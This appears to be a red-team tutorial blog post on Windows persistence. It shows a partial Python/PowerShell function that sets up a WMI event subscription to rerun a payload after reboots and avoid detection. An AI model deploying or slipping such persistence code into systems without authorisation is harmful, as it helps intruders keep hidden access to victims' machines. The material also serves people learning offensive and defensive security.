30 Days of Red Team: Day 8 — Windows Persistence

Maxwell Cross • Nov 19, 2025

Getting in is hard. Getting locked out is easy.

You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius.

Then the user reboots their computer.

Your connection dies. Your shell is gone. And because you didn't establish Persistence, you have to start over from scratch.

Today, we begin Week 2 by ensuring that never happens. We are building the tools to survive reboots, logoffs, and even active hunting by the Blue Team.

A Glimpse of the Code: WMI Event Subscriptions

Amateurs put a batch file in the Startup folder. Professionals use WMI.

Windows Management Instrumentation (WMI) allows us to create "fileless" persistence that never touches the disk and doesn't show up in the Registry. Here is the core logic for binding a malicious payload to a system event:

def create_wmi_persistence(self, payload_command, event_name):
    """
    Creates WMI event subscription for stealthy persistence.
    1. Filter: Defines WHEN to trigger (e.g., system uptime > 2 min)
    2. Consumer: Defines WHAT to run (our payload)
    3. Binding: Connects them together
    """
    ps_script = f'''
    # 1. Event Filter
    $FilterArgs = @{{
        name='_{event_name}_Filter';
        EventNameSpace='root\\CimV2';
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
               WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }};
    
    # 2. Event Consumer
    $ConsumerArgs = @{{
        name='_{event_name}_Consumer';
        CommandLineTemplate="{payload_command}"
    }};
    
    # 3. Binding
    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding ...
    '''
    return ps_script

This script buries your access deep within the Windows operating system, making it incredibly difficult to detect without specialized forensic tools.
